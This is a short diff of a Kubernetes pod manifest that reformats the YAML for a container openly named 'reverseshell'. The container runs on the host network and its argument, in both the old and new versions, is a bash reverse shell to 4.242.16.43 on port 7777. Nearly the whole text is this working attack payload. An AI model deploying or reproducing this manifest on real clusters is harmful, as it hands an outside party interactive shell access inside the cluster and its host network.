@@ -28,8 +28,11 @@ metadata:
 spec:
   hostNetwork: true
   containers:
-  - name: reverseshell
-    image: ubuntu
-    command: ["/bin/bash", "-c", "--"]
-    args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
+    - name: reverseshell
+      image: ubuntu
+      command:
+        - /bin/bash
+        - -c
+      args:
+        - bash -i >& /dev/tcp/4.242.16.43/7777 0>&1
     
